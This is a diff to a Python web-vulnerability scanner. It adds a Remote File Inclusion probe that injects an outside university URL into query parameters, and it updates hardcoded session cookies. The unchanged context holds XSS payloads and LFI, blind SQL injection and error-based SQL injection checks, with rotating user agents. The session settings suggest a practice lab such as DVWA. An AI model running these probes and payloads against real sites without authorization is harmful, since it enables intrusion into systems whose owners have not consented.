@@ -158,6 +158,8 @@ def createSqliUrl(url):
                            "\"><script>alert(\"XSS\")</script>",
                            "</script><script>alert(1)</script>",
                            "<BODY BACKGROUND=\"javascript:alert('XSS')\">"]
+            rfipayloads = ["http://www.aaup.edu/",
+                           "https://www.aaup.edu/"]
             
             for payload in xssPayloads:
                 paramXxploitStr = paramStr+payload
@@ -177,6 +179,11 @@ def createSqliUrl(url):
                 zurl = url.replace(paramStr, paramZxploitStr)
                 if(getLFI(zurl) == "exploited"):
                     break
+            for rpayload in rfipayloads:
+                paramRxploitStr = param[0]+"="+rpayload
+                zurl = url.replace(paramStr, paramRxploitStr)
+                if(getRFI(zurl) == "exploited"):
+                    break
         except:
             pass
 
@@ -187,7 +194,7 @@ def getLFI(link):
     """
     try:
         cookies = {"pma_lang": "en", "security": "low",
-                   "PHPSESSID": "d3dkdbph1se3kb9v412ha59qer"}
+                   "PHPSESSID": "4e2u546t155ed0ci3o4h04hqde"}
         user_agent = random.choice(user_agent_list)
         headers = {'User-Agent': user_agent}
         request = requests.get(link, headers=headers,
@@ -197,10 +204,10 @@ def getLFI(link):
         if error in request.text:
             print("[#]["+Fore.YELLOW+"LFI-CHECK"+Fore.RESET+"]  "+link+Fore.GREEN +"   Maybe it's Vulnerable..."+Fore.RESET)
         else:
-            print("[-]"+Fore.RED+"LFI-FAIL"+Fore.RESET+"]  "+Fore.RESET+link+Fore.RED +
+            print("-["+Fore.RED+"LFI-FAIL"+Fore.RESET+"]-  "+Fore.RESET+link+Fore.RED +
                   "   "+Fore.RESET)
         if request.status_code == 200 and string in request.text:
-            print("[+]"+Fore.GREEN+"LFI-INFO"+Fore.RESET+"]  "+link+Fore.GREEN +
+            print("+["+Fore.GREEN+"LFI-INFO"+Fore.RESET+"]+  "+link+Fore.GREEN +
                   "   Vulnerable"+Fore.RESET)
             with open("lfiResults.txt", "a") as fil:
                 fil.write(link+"\n")
@@ -215,20 +222,52 @@ def getLFI(link):
         pass
 
 
+def getRFI(link):
+    """
+    This function is created to exploit Remote File Inclusion on the Link Provided as paramater
+    """
+    try:
+        cookies = {"pma_lang": "en", "security": "low",
+                   "PHPSESSID": "4e2u546t155ed0ci3o4h04hqde"}
+        user_agent = random.choice(user_agent_list)
+        headers = {'User-Agent': user_agent}
+        request = requests.get(link, headers=headers,
+                               verify=False, cookies=cookies)
+        error = "ARAB AMERICAN UNIVERSITY"
+        if error in request.text:
+            print("[#]["+Fore.YELLOW+"RFI-CHECK"+Fore.RESET+"]  "+link+Fore.GREEN +"   Maybe it's Vulnerable..."+Fore.RESET)
+        else:
+            print("-["+Fore.RED+"RFI-FAIL"+Fore.RESET+"]-  "+Fore.RESET+link+Fore.RED +
+                  "   "+Fore.RESET)
+        if request.status_code == 200 and error in request.text:
+            print("+["+Fore.GREEN+"RFI-INFO"+Fore.RESET+"]+  "+link+Fore.GREEN +
+                  "   Vulnerable"+Fore.RESET)
+            with open("rfiResults.txt", "a") as fil:
+                fil.write(link+"\n")
+            return "exploited"
+        else:
+            return "notyet"
+    except KeyboardInterrupt:
+        sys.exit()
+    # except IOError as io:
+    #     print(io)
+    except:
+        pass
+
 def blindSQLi(link):
     """
     This function is created to exploit Blind SQL Injection on the Link Provided as paramater
     """
     try:
         cookies = {"pma_lang": "en", "security": "low",
-                   "PHPSESSID": "d3dkdbph1se3kb9v412ha59qer"}
+                   "PHPSESSID": "4e2u546t155ed0ci3o4h04hqde"}
         # Change User Agent at each Request.
         user_agent = random.choice(user_agent_list)
         headers = {'User-Agent': user_agent}
         request = requests.get(link, headers=headers,
                                verify=False, cookies=cookies)
         if (request.status_code == 200) and (request.elapsed.total_seconds() >= 5):
-            print("[+]"+Fore.GREEN+"BLIND-INFO"+Fore.RESET+"]  "+link +
+            print("+["+Fore.GREEN+"BLIND-INFO"+Fore.RESET+"]+  "+link +
                   Fore.GREEN+"   Vulnerable"+Fore.RESET)
             with open("blindSQLiResults.txt", "a") as fil1:
                 fil1.write(link+"\n")
@@ -249,20 +288,18 @@ def xssFind(link, payload):
     """
     try:
         # Change User Agent at each Request.
-        cookies = {"pma_lang": "en", "security": "low",
-                   "PHPSESSID": "d3dkdbph1se3kb9v412ha59qer"}
         user_agent = random.choice(user_agent_list)
         headers = {'User-Agent': user_agent}
         request = requests.get(link, headers=headers,
-                               verify=False, cookies=cookies)
+                               verify=False)
         if payload in request.content:
-            print("[+]"+Fore.GREEN+"XSS-INFO"+Fore.RESET+"]  "+link +
+            print("+["+Fore.GREEN+"XSS-INFO"+Fore.RESET+"]+  "+link +
                   Fore.GREEN+"   Vulnerable"+Fore.RESET)
             with open("xssResults.txt", "a") as fil1:
                 fil1.write(link+"\n")
             return "exploited"
         else:
-            print("[-]"+Fore.YELLOW+"XSS-CHECK"+Fore.RESET+"]  "+link)
+            print("-["+Fore.YELLOW+"XSS-CHECK"+Fore.RESET+"]-  "+link)
             return "notyet"
     except KeyboardInterrupt:
         sys.exit()
@@ -276,48 +313,48 @@ def checkSqli(url):
     This function is created to check SQL Injection at the url provided as parameter
     """
     cookies = {"pma_lang": "en", "security": "low",
-               "PHPSESSID": "d3dkdbph1se3kb9v412ha59qer"}
+               "PHPSESSID": "4e2u546t155ed0ci3o4h04hqde"}
     r = requests.get(url, verify=False, timeout=10, cookies=cookies)
-    print("[#]["+Fore.YELLOW+"SQL-CHECK"+Fore.RESET+"]  "+url)
+    print("[#]["+Fore.YELLOW+"SQL-CHECK]  "+Fore.RESET+url)
     html = r.content
     for regg in MySQL:
         if(re.search(regg, html)):
-            print("[+]"+Fore.GREEN+"SQL-INFO"+Fore.RESET+"]  "+url+Fore.GREEN +
+            print("+["+Fore.GREEN+"SQL-INFO"+Fore.RESET+"]+  "+url+Fore.GREEN +
                   "\t Vulnerable"+Fore.RESET)
             return "done"
     for regg in PostgreSQL:
         if(re.search(regg, html)):
-            print("[+]"+Fore.GREEN+"SQL-INFO"+Fore.RESET+"]  "+url+Fore.GREEN +
+            print("+["+Fore.GREEN+"SQL-INFO"+Fore.RESET+"]+  "+url+Fore.GREEN +
                   "\t Vulnerable"+Fore.RESET)
             return "done"
     for regg in MicrosoftSQLServer:
         if(re.search(regg, html)):
-            print("[+]"+Fore.GREEN+"SQL-INFO"+Fore.RESET+"]  "+url+Fore.GREEN +
+            print("+["+Fore.GREEN+"SQL-INFO"+Fore.RESET+"]+  "+url+Fore.GREEN +
                   "\t Vulnerable"+Fore.RESET)
             return "done"
     for regg in MicrosoftAccess:
         if(re.search(regg, html)):
-            print("[+]"+Fore.GREEN+"SQL-INFO"+Fore.RESET+"]  "+url+Fore.GREEN +
+            print("+["+Fore.GREEN+"SQL-INFO"+Fore.RESET+"]+  "+url+Fore.GREEN +
                   "\t Vulnerable"+Fore.RESET)
             return "done"
     for regg in Oracle:
         if(re.search(regg, html)):
-            print("[+]"+Fore.GREEN+"SQL-INFO"+Fore.RESET+"]  "+url+Fore.GREEN +
+            print("+["+Fore.GREEN+"SQL-INFO"+Fore.RESET+"]+  "+url+Fore.GREEN +
                   "\t Vulnerable"+Fore.RESET)
             return "done"
     for regg in dIBMDB2:
         if(re.search(regg, html)):
-            print("[+]"+Fore.GREEN+"SQL-INFO"+Fore.RESET+"]  "+url+Fore.GREEN +
+            print("+["+Fore.GREEN+"SQL-INFO"+Fore.RESET+"]+  "+url+Fore.GREEN +
                   "\t Vulnerable"+Fore.RESET)
             return "done"
     for regg in SQLite:
         if(re.search(regg, html)):
-            print("[+]"+Fore.GREEN+"SQL-INFO"+Fore.RESET+"]  "+url+Fore.GREEN +
+            print("+["+Fore.GREEN+"SQL-INFO"+Fore.RESET+"]+  "+url+Fore.GREEN +
                   "\t Vulnerable"+Fore.RESET)
             return "done"
     for regg in Sybase:
         if(re.search(regg, html)):
-            print("[+]"+Fore.GREEN+"SQL-INFO"+Fore.RESET+"]  "+url+Fore.GREEN +
+            print("+["+Fore.GREEN+"SQL-INFO"+Fore.RESET+"]+  "+url+Fore.GREEN +
                   "\t Vulnerable"+Fore.RESET)
             return "done"
 
